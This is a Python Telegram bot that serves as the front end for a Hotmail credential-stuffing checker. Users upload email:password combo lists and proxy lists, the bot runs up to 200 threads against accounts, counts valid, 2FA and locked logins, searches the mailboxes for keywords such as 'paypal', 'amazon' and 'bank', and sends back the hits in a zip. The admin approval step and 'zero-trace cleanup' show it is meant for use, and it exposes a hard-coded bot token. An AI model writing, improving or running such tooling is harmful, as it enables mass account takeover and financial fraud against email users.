import os
import asyncio
import logging
import zipfile
import shutil
import time
import json
from dataclasses import dataclass, field
from typing import Dict, Set

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    filters, ContextTypes
)
from checker_core import HotmailCheckerV77

# ============================================================================
# LOGGING & CONSTANTS
# ============================================================================
logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO
)
logger = logging.getLogger(__name__)

BOT_TOKEN = "8278566702:AAGW3849-ms-ghFYZLJU9CUd8AKV__yKbyE"
ADMIN_ID = 6738343341

DATA_DIR = "bot_data"
APPROVED_USERS_FILE = os.path.join(DATA_DIR, "approved_users.json")
os.makedirs(DATA_DIR, exist_ok=True)

# ============================================================================
# SESSION MANAGEMENT
# ============================================================================

@dataclass
class UserSession:
    """Isolated user workspace"""
    user_id: int
    combo_path: str = None
    proxy_path: str = None
    threads: int = 50
    keywords: list = field(default_factory=lambda: ['paypal', 'amazon', 'bank'])
    checker: HotmailCheckerV77 = None
    check_task: asyncio.Task = None
    status_message_id: int = None
    last_update_time: float = 0
    is_running: bool = False

class SessionManager:
    def __init__(self):
        self.sessions: Dict[int, UserSession] = {}
        self.approved_users: Set[int] = self._load_approved_users()
        # Ensure Admin is always approved
        self.approved_users.add(ADMIN_ID)

    def get_session(self, user_id: int) -> UserSession:
        if user_id not in self.sessions:
            self.sessions[user_id] = UserSession(user_id=user_id)
        return self.sessions[user_id]

    def _load_approved_users(self) -> Set[int]:
        if os.path.exists(APPROVED_USERS_FILE):
            try:
                with open(APPROVED_USERS_FILE, 'r') as f:
                    return set(json.load(f))
            except:
                return set()
        return set()

    def save_approved_users(self):
        with open(APPROVED_USERS_FILE, 'w') as f:
            json.dump(list(self.approved_users), f)

    def is_approved(self, user_id: int) -> bool:
        return user_id == ADMIN_ID or user_id in self.approved_users

    def approve_user(self, user_id: int):
        self.approved_users.add(user_id)
        self.save_approved_users()

    def reject_user(self, user_id: int):
        if user_id in self.approved_users:
            self.approved_users.remove(user_id)
            self.save_approved_users()

    def reset_session(self, user_id: int):
        """Clean up user session for fresh run"""
        if user_id in self.sessions:
            session = self.sessions[user_id]
            # Cancel task if running
            if session.check_task and not session.check_task.done():
                session.checker.stop()
                session.check_task.cancel()

            # Delete files
            user_dir = os.path.join(DATA_DIR, str(user_id))
            if os.path.exists(user_dir):
                shutil.rmtree(user_dir, ignore_errors=True)

            # Reset state but keep config
            session.combo_path = None
            session.proxy_path = None
            session.checker = None
            session.check_task = None
            session.status_message_id = None
            session.is_running = False

session_manager = SessionManager()

# ============================================================================
# BOT HANDLERS
# ============================================================================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id

    if not session_manager.is_approved(user_id):
        await update.message.reply_text("⏳ Your access request is Pending approval by Admin.")

        # Notify Admin
        keyboard = [
            [
                InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}"),
                InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
            ]
        ]
        try:
            await context.bot.send_message(
                chat_id=ADMIN_ID,
                text=f"👤 New Access Request:\nUser: {user.mention_html()}\nID: <code>{user_id}</code>",
                reply_markup=InlineKeyboardMarkup(keyboard),
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Failed to notify admin: {e}")
        return

    await update.message.reply_html(
        f"👋 Welcome back, Elite User {user.mention_html()}!\n\n"
        "<b>Commands:</b>\n"
        "• Upload <code>combo.txt</code> or <code>proxy.txt</code> directly.\n"
        "• /check - Start checking\n"
        "• /stop - Stop checking\n"
        "• /threads [n] - Set threads (1-200)\n"
        "• /keywords [w1, w2] - Set keywords\n"
        "• /status - Check current status"
    )

async def admin_approval_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    data = query.data
    action, target_id_str = data.split("_")
    target_id = int(target_id_str)

    if action == "approve":
        session_manager.approve_user(target_id)
        await query.edit_message_text(f"✅ User {target_id} Approved.")
        try:
            await context.bot.send_message(target_id, "✅ You have been approved! Type /start.")
        except:
            pass
    elif action == "reject":
        session_manager.reject_user(target_id)
        await query.edit_message_text(f"❌ User {target_id} Rejected.")
        try:
            await context.bot.send_message(target_id, "❌ Your access request was rejected.")
        except:
            pass

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id):
        return

    file = update.message.document
    if file.mime_type and "text" in file.mime_type or file.file_name.endswith(".txt"):
        # Store file_id temporarily for the user context
        context.user_data['last_uploaded_file_id'] = file.file_id

        keyboard = [
            [
                InlineKeyboardButton("📂 Set as Combo", callback_data="set_combo"),
                InlineKeyboardButton("🛡️ Set as Proxy", callback_data="set_proxy"),
            ]
        ]
        await update.message.reply_text(
            f"Received <code>{file.file_name}</code>.\nSize: {file.file_size/1024:.2f} KB",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode="HTML"
        )

async def file_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()

    user_id = query.from_user.id
    session = session_manager.get_session(user_id)
    user_dir = os.path.join(DATA_DIR, str(user_id))
    os.makedirs(user_dir, exist_ok=True)

    file_id = context.user_data.get('last_uploaded_file_id')
    if not file_id:
        await query.edit_message_text("⚠️ File expired. Upload again.")
        return

    action = query.data
    new_file = await context.bot.get_file(file_id)

    if action == "set_combo":
        path = os.path.join(user_dir, "combo.txt")
        await new_file.download_to_drive(path)
        session.combo_path = path
        # Count
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                count = sum(1 for _ in f)
            await query.edit_message_text(f"✅ Combo list set! ({count} lines).")
        except:
            await query.edit_message_text("✅ Combo list set!")

    elif action == "set_proxy":
        path = os.path.join(user_dir, "proxy.txt")
        await new_file.download_to_drive(path)
        session.proxy_path = path
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as f:
                count = sum(1 for _ in f)
            await query.edit_message_text(f"✅ Proxy list set! ({count} lines).")
        except:
            await query.edit_message_text("✅ Proxy list set!")

async def set_threads(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return

    if context.args:
        try:
            val = int(context.args[0])
            if 1 <= val <= 200:
                session_manager.get_session(user_id).threads = val
                await update.message.reply_text(f"⚙️ Threads set to {val}.")
            else:
                await update.message.reply_text("⚠️ Range: 1-200.")
        except ValueError:
            await update.message.reply_text("⚠️ Invalid number.")
    else:
        await update.message.reply_text("Usage: /threads [number]")

async def set_keywords(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return

    if context.args:
        # Join then split by comma to allow "word1, word2" format
        raw = " ".join(context.args)
        keywords = [k.strip() for k in raw.split(",") if k.strip()]
        session_manager.get_session(user_id).keywords = keywords
        await update.message.reply_text(f"🔑 Keywords updated: {', '.join(keywords)}")
    else:
        await update.message.reply_text("Usage: /keywords word1, word2")

async def stop_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    session = session_manager.get_session(user_id)

    if session.is_running and session.checker:
        session.checker.stop()
        await update.message.reply_text("🛑 Stopping... Finalizing results.")
    else:
        await update.message.reply_text("⚠️ No active check.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return

    session = session_manager.get_session(user_id)

    if session.is_running:
        stats = session.checker.stats
        await update.message.reply_html(
            f"⚡ <b>Current Status: Running</b>\n"
            f"🧵 Threads: {session.threads}\n"
            f"📊 Progress: {stats['checked']}/{stats['total']}\n"
            f"✅ Hits: {stats['valid']} | 🔐 2FA: {stats['custom']}\n"
            f"❌ Invalid: {stats['invalid']} | 🔒 Locked: {stats['locked']}"
        )
    else:
        msg = (
            "💤 <b>Current Status: Idle</b>\n"
            f"Threads: {session.threads}\n"
            f"Keywords: {', '.join(session.keywords)}\n"
        )
        if session.combo_path:
            msg += "✅ Combo Loaded\n"
        if session.proxy_path:
            msg += "✅ Proxy Loaded\n"
        await update.message.reply_html(msg)

async def check_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not session_manager.is_approved(user_id): return

    session = session_manager.get_session(user_id)

    if session.is_running:
        await update.message.reply_text("⚠️ Scan already in progress.")
        return

    if not session.combo_path or not os.path.exists(session.combo_path):
        await update.message.reply_text("⚠️ Upload a Combo list first!")
        return

    # Load data
    with open(session.combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        combos = f.readlines()

    proxies = []
    if session.proxy_path and os.path.exists(session.proxy_path):
        with open(session.proxy_path, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = f.readlines()

    # Config
    config = {
        'threads': session.threads,
        'search_keywords': session.keywords,
        'proxy_type': 'http'
    }

    # Initialize
    session.checker = HotmailCheckerV77(combos, proxies, config)
    session.is_running = True

    status_msg = await update.message.reply_text("🚀 Initializing scan...")
    session.status_message_id = status_msg.message_id

    # Start background task
    session.check_task = asyncio.create_task(run_checker_task(context.bot, user_id, update.effective_chat.id))

async def run_checker_task(bot, user_id, chat_id):
    session = session_manager.get_session(user_id)

    try:
        # Define update callback
        async def progress_callback(stats):
            now = time.time()
            if now - session.last_update_time > 10: # 10s updates
                session.last_update_time = now
                text = (
                    f"⚡ <b>Status:</b> Running\n"
                    f"🧵 Threads: {session.threads}\n"
                    f"📊 Progress: {stats['checked']}/{stats['total']}\n"
                    f"✅ Hits: {stats['valid']} | 🔐 2FA: {stats['custom']}\n"
                    f"❌ Bad: {stats['invalid']} | 🔒 Locked: {stats['locked']}"
                )
                try:
                    await bot.edit_message_text(
                        chat_id=chat_id,
                        message_id=session.status_message_id,
                        text=text,
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

        # Run checker
        await session.checker.run(progress_callback)

        # Finalization
        stats = session.checker.stats
        final_text = (
            f"🏁 <b>Scan Complete</b>\n"
            f"📊 Total: {stats['total']}\n"
            f"✅ Valid: {stats['valid']}\n"
            f"🔐 2FA: {stats['custom']}\n"
            f"❌ Invalid: {stats['invalid']}"
        )
        try:
            await bot.edit_message_text(
                chat_id=chat_id,
                message_id=session.status_message_id,
                text=final_text,
                parse_mode="HTML"
            )
        except:
            pass

        # Generate Results
        user_dir = os.path.join(DATA_DIR, str(user_id))
        results_dir = os.path.join(user_dir, "results")
        files = session.checker.generate_results_files(results_dir)

        if files:
            zip_path = os.path.join(user_dir, f"Results_{user_id}_{int(time.time())}.zip")
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for file in files:
                    zipf.write(file, os.path.basename(file))

            await bot.send_document(
                chat_id=chat_id,
                document=open(zip_path, 'rb'),
                caption="📂 Your Results"
            )

    except Exception as e:
        logger.error(f"Task Error: {e}")
        await bot.send_message(chat_id=chat_id, text=f"⚠️ Critical Error: {e}")
    finally:
        # Zero-Trace Cleanup & Reset
        session_manager.reset_session(user_id)
        await bot.send_message(chat_id=chat_id, text="♻️ Session reset. Ready for new task.")

def main():
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("check", check_command))
    application.add_handler(CommandHandler("stop", stop_check))
    application.add_handler(CommandHandler("threads", set_threads))
    application.add_handler(CommandHandler("keywords", set_keywords))
    application.add_handler(CommandHandler("status", status_command))

    application.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    application.add_handler(CallbackQueryHandler(admin_approval_callback, pattern=r"^(approve|reject)_"))
    application.add_handler(CallbackQueryHandler(file_callback_handler, pattern=r"^set_(combo|proxy)$"))

    print("Bot is running...")
    application.run_polling()

if __name__ == "__main__":
    main()
